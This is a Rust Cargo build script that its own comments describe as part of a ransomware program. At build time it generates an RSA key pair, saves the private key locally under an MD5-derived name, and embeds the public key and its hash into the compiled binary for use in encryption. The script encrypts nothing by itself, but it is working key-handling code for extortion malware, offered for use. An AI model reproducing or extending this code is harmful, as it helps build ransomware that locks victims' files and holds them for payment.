use std::{fs, path::Path, str};
use rand::{rngs::StdRng, SeedableRng};
use rsa::{pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey}, RsaPrivateKey, RsaPublicKey};
use base64::{self, engine::{general_purpose, GeneralPurposeConfig}, Engine};

/// Runs before compiling the main program (main.rs)
fn main() {
    // Generate keys:
    let mut rng = StdRng::from_entropy();
    let bits = 2048;
    let priv_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
    let pub_key = RsaPublicKey::from(&priv_key);

    // Get DER format public key
    let pub_key_der = pub_key.to_pkcs1_der().expect("failed to serialize public key");

    // Setup base64 config:
    let base64_config = GeneralPurposeConfig::new()
        .with_encode_padding(false);

    // Hash the public key:
    let pub_hash = md5::compute(&pub_key_der);
    let pub_hash_b64 = general_purpose::GeneralPurpose::new(&base64::alphabet::URL_SAFE, base64_config).encode(pub_hash.as_ref());

    // Write the private key:
    let _ = fs::create_dir("keys/");
    let dest_path = Path::new("keys/").join(format!("{}-private.key", pub_hash_b64));
    let priv_key_der = priv_key.to_pkcs1_der().expect("failed to serialize public key");
    fs::write(dest_path, priv_key_der.as_bytes()).expect("Unable to write file");

    // Set the ransomware keyhash:
    set_var("pubkeyhash", &pub_hash_b64);

    // Set the ransomware pub key:
    let pub_key_b64 = general_purpose::GeneralPurpose::new(&base64::alphabet::URL_SAFE, base64_config).encode(pub_key_der);
    set_var("pubkey", &pub_key_b64);
    
}

/// Set a cargo variable
fn set_var(variable: &str, value: &str){
    println!("cargo:rustc-env={}={}", variable, value);
}